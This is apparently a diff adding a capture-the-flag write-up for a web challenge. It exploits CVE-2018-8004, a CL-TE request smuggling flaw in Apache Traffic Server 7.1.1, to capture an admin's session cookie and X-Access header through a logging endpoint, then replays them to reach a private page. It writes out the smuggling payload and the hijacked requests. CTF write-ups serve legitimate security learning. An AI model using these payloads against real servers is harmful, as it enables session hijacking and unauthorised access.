@@ -1,0 +1,74 @@
+<h3>Port 33337 [Web]</h3>
+
+<p>In the <code>Server</code> response header, we could see that the Apache Traffic Server (ATS) 7.1.1 was used,</p>
+
+<p>This is vulnerable to CVE-2018-8004, a request smuggling vulnerability, and I came across a nice writeup <a href="https://medium.com/@knownsec404team/protocol-layer-attack-http-request-smuggling-cc654535b6f">here</a>. The relevant patch we are looking at is <a href="https://github.com/apache/trafficserver/pull/3231">here</a> - a lack of validation for <code>Content-Length</code> headers.</p>
+
+<p>In the vulnerable version, even if the <code>Transfer-Encoding</code> header exists, the <code>Content-Length</code> header is used. This leads to a request smuggling vulnerability if the backend server processes the <code>Transfer-Encoding</code> header instead of the <code>Content-Length</code> header to decide where the request ends.</p>
+
+<p><img src="../.gitbook/assets/Screenshot 2021-12-07 at 1.03.20 PM.png" alt="" /></p>
+
+<p>It was observed that whenever a request is made to <code>/save.php</code>, an entry is appended to a "log file", which contains the cookies and the value of the <code>X-Access</code> header.</p>
+
+<p>Assuming that an admin visits the site, we could use a CL-TE request smuggling attack to direct the admin to <code>/save.php</code>.</p>
+
+<p>Consider the following payload:</p>
+
+<p>```http
+GET / HTTP/1.1
+Host: threeofhearts.ctf.net
+Content-Length: 30
+Transfer-Encoding: chunked</p>
+
+<p>0</p>
+
+<p>GET /save.php HTTP/1.1
+```</p>
+
+<p>The ATS server processes the <code>Content-Length</code> header, and thus forwards the entire payload as a single request to the Nginx backend.&#x20;</p>
+
+<p>However, Nginx sees the <code>Transfer-Encoding</code> header and decides that the first request ends early. This is a full, complete request.</p>
+
+<p><code>http
+GET / HTTP/1.1
+Host: threeofhearts.ctf.net
+Content-Length: 30
+Transfer-Encoding: chunked
+</code></p>
+
+<p>This is then followed by a second request, which is <em>not yet completed.</em></p>
+
+<p><code>http
+GET /save.php HTTP/1.1
+</code></p>
+
+<p>When the admin visits the site (the third request), his request is appended to the above incomplete request - the second and third request thus are processed as one single request.</p>
+
+<p>```http
+GET /save.php HTTP/1.1</p>
+
+<p>...</p>
+
+<p>Cookie: <Admin Cookies>
+X-Access: <Admin X-Access Header>
+```</p>
+
+<p>Crucially, this request contains the admin's <code>Cookie</code> and <code>X-Access</code> headers.</p>
+
+<p>In the log file, we can view the cookie:</p>
+
+<p><code>
+Params:
+Headers:
+    X-Access: private
+    Cookie: PHPSESSID=8m9k6s84bmdf270tbi81bpacc7
+</code></p>
+
+<p>Then, visit <code>private.php</code> to view the flag.</p>
+
+<p><code>http
+GET /private.php HTTP/1.1
+Host: threeofhearts.ctf.net
+X-Access: private
+Cookie: PHPSESSID=8m9k6s84bmdf270tbi81bpacc7
+</code></p>
